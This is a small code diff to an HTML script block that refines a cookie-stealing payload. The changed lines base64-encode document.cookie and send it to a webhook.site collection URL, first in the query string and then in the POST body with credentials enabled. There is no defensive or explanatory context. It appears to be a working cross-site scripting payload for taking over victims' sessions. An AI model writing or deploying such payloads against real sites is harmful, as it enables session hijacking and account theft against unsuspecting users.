@@ -8,8 +8,8 @@
             console.log(document.cookie);
         }
     }
-    xhr.open('POST', 'https://webhook.site/93ddffb9-857a-4a78-ad47-f4a7526ecbe8/?'+btoa(document.cookie), true);
+    xhr.open('POST', 'https://webhook.site/93ddffb9-857a-4a78-ad47-f4a7526ecbe8/', true);
     xhr.withCredentials = true;
-    
-    xhr.send(null);
+    var params = 's='+btoa(document.cookie);
+    xhr.send(params);
     </script>
